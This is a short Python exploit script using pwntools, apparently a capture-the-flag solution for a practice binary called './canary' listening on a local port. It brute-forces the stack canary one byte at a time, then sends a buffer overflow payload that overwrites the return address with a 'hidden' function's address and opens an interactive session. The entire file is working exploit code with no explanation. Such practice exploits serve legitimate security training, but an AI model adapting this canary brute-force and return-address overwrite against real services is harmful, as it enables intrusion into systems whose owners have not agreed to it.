from pwn import *

pname='./canary'
# p=process(pname)
p=remote('127.0.0.1',9995)
elf=ELF(pname)
payload=b'a'*0x8
canary=[0]
for i in range(7):
    canary.append(0)
    print(i+1)
    for j in range(256):
        p.recvuntil("hello~\n")
        # print(i+1,hex(j))
        p.recv()
        canary[i+1]=j
        p.send(payload+bytes(canary))
        # p.recvuntil('hello~\n')
        r=p.recv(6)
        # print(r)
        if b'Maybe' in r:
            print('canary[%d]=%x'%(i+1,j))
            break
info('canary:%s'%(str(canary)))
payload=b'a'*0x8+bytes(canary)+p64(0)+p64(elf.sym['hidden'])
p.send(payload)
p.interactive()